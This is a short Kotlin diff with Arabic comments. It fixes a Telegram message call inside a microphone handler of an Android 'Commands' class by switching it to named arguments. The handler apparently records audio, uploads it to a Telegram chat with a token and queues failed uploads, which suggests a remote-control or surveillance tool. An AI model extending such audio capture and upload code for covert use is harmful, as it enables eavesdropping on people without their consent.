@@ -30,6 +30,8 @@ import kotlin.random.Random
  * - ✅ تحويل جميع استدعاءات sendTelegramMessage التي تستخدم cid إلى cid.toString().
  * - ✅ التأكد من أن جميع استدعاءات sendTelegramMessage في sendTextFile تستخدم chatId.toString().
  * - ✅ إضافة @Suppress("UNCHECKED_CAST") للتعامل مع التحويلات الآمنة.
+ * - ✅ **إصلاح نهائي:** استخدام المعاملات المسماة (Named Arguments) في استدعاء sendTelegramMessage داخل handleMic
+ *   لتجنب خلط ترتيب المعاملات ونوع `threadId` مع `receivingToken`.
  */
 class Commands private constructor(context: Context) {
 
@@ -1113,7 +1115,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج الميكروفون (معدل لتمرير threadId إلى sendTelegramVoice)
+    //  ✅ معالج الميكروفون (معدل مع إصلاح استدعاء sendTelegramMessage)
     // ============================================================
 
     private suspend fun handleMic(
@@ -1154,9 +1156,15 @@ class Commands private constructor(context: Context) {
                     val success = sendTelegramVoice(tg, target, audioPath, receivingToken, threadId)
                     if (success) {
                         safeRemove(audioPath)
+                        // ✅ ✅ ✅ التعديل النهائي: استخدام المعاملات المسماة (Named Arguments)
+                        // لتجنب خلط ترتيب المعاملات وتمرير threadId في خانة receivingToken.
                         sendTelegramMessage(
-                            tg, cid.toString(), "✅ تم إرسال التسجيل الصوتي بنجاح.",
-                            receivingToken, threadId, replyToMessageId
+                            tg = tg,
+                            chatId = cid.toString(),
+                            text = "✅ تم إرسال التسجيل الصوتي بنجاح.",
+                            receivingToken = receivingToken,
+                            threadId = threadId,
+                            replyToMessageId = replyToMessageId
                         )
                     } else {
                         Log.w(TAG, "⚠️ Failed to send audio, adding to pending tasks")
